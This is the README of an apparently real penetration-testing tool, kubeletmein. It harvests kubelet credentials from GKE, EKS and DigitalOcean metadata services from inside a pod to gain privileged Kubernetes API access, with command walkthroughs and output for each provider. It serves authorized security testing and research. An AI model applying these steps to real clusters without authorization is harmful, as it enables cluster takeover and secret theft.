# Kubeletmein

This is a simple penetration testing tool which takes advantage of public cloud provider approaches to providing kubelet credentials to nodes in a Kubernetes cluster in order to gain privileged access to the k8s API. This access can then potentially be used to further compromise the applications running in the cluster or, in many cases, access secrets that facilitate complete control of Kubernetes.

## How it works

`kubeletmein` is a simple Go binary that is designed to be run from a pod inside your target cluster. Typically this will be either via exploiting a weakness in a web application running on Kubernetes or, perhaps an internal penetration test where the client has given you exec access into a pod.

It reads kubelet credentials from the cloud provider metadata and configures a kubeconfig file that you can use with `kubectl` to access the API.

There's more info in our blog post at [https://www.4armed.com/blog/hacking-kubelet-on-gke/](https://www.4armed.com/blog/hacking-kubelet-on-gke/).

## Supported providers

### GKE

GKE is fully supported and relies on the metadata concealmeant being disabled (the default setting).

### EKS

EKS support added by @airman604 based on the AWS EKS [bootstrap script](https://github.com/awslabs/amazon-eks-ami/blob/master/files/bootstrap.sh). This is a one step process and doesn't create a fake node, but rather impersonates the node on which the pod is running.

### Digital Ocean

By default, DO provides creds by metadata and this cannot be disabled.

### AKS

I should probably look at Azure at some point but....Microsoft. ;-)


## Installation

It's a single binary compiled for Linux. Download it with `cURL` or `wget` from the releases page at [https://github.com/4armed/kubeletmein/releases](https://github.com/4armed/kubeletmein/releases).

## How to

### GKE

On GKE kubeletmein is a two stage process. First we write out a bootstrap-kubeconfig using the certificates and key from the `kube-env` instance attribute. Then we generate a certificate sigining request and use the bootstrap config to submit it to the API for approval.

```
~ $ kubeletmein bootstrap gke
2018-11-29T21:21:26Z [ℹ]  fetching kubelet creds from metadata service
2018-11-29T21:21:26Z [ℹ]  writing ca cert to: ca-certificates.crt
2018-11-29T21:21:26Z [ℹ]  writing kubelet cert to: kubelet.crt
2018-11-29T21:21:26Z [ℹ]  writing kubelet key to: kubelet.key
2018-11-29T21:21:26Z [ℹ]  generating bootstrap-kubeconfig file at: bootstrap-kubeconfig
2018-11-29T21:21:26Z [ℹ]  wrote bootstrap-kubeconfig
2018-11-29T21:21:26Z [ℹ]  now generate a new node certificate with: kubeletmein gke generate
```

Then we download the certificate and configure `kubeconfig`.

```
~ $ kubeletmein generate -n gke-cluster19-default-pool-6c73beb1-wmh3
2018-11-29T21:23:33Z [ℹ]  using bootstrap-config to request new cert for node: gke-cluster19-default-pool-6c73beb1-wmh3
2018-11-29T21:23:33Z [ℹ]  got new cert and wrote kubeconfig
2018-11-29T21:23:33Z [ℹ]  now try: kubectl --kubeconfig kubeconfig get pods
```

Now you can use the kubeconfig, as it suggests.

```
kubectl --kubeconfig kubeconfig get pods
```

### EKS

On EKS we can impersonate current node in a single step using IAM authentication.

```
~ $ kubeletmein eks
2021-03-02T21:37:59Z [ℹ]  generating kubeconfig for current EKS node
2021-03-02T21:37:59Z [ℹ]  fetching cluster information from user-data from the metadata service
2021-03-02T21:37:59Z [ℹ]  getting IMDSv2 token
2021-03-02T21:37:59Z [ℹ]  getting user-data
2021-03-02T21:37:59Z [ℹ]  generating EKS node kubeconfig file at: kubeconfig
2021-03-02T21:37:59Z [ℹ]  wrote kubeconfig
2021-03-02T21:37:59Z [ℹ]  to use the kubeconfig, download aws-iam-authenticator to the current directory and make it executable by following the instructions at https://docs.aws.amazon.com/eks/latest/userguide/install-aws-iam-authenticator.html
2021-03-02T21:37:59Z [ℹ]  then try: kubectl --kubeconfig kubeconfig get pods
```

Now you can use the kubeconfig, as it suggests. Follow the instructions at
https://docs.aws.amazon.com/eks/latest/userguide/install-aws-iam-authenticator.html to download `aws-iam-authenticator`
(and make it executable), then run:

```
kubectl --kubeconfig kubeconfig get pods
```

### Digital Ocean

```
~ $ kubeletmein bootstrap do
2018-12-12T23:34:19Z [ℹ]  fetching kubelet creds from metadata service
2018-12-12T23:34:19Z [ℹ]  writing ca cert to: ca-certificates.crt
2018-12-12T23:34:19Z [ℹ]  generating bootstrap-kubeconfig file at: bootstrap-kubeconfig
2018-12-12T23:34:19Z [ℹ]  wrote bootstrap-kubeconfig
2018-12-12T23:34:19Z [ℹ]  now generate a new node certificate with: kubeletmein do generate
```

Now generate the kubeconfig with a downloaded cert
```
~ $ kubeletmein generate -n whatevs
2018-12-12T23:36:46Z [ℹ]  using bootstrap-config to request new cert for node: whatevs
2018-12-12T23:36:46Z [ℹ]  got new cert and wrote kubeconfig
2018-12-12T23:36:46Z [ℹ]  now try: kubectl --kubeconfig kubeconfig get pods
```

## Contributing

Please submit pull requests on a separate branch. We welcome all improvements. It's not the world's best bit of code.

Please raise issues on GitHub if you find any, including feature requests.

## Disclaimer

This is intended for professional security testing or research. We subscribe to the DBAD philosophy.
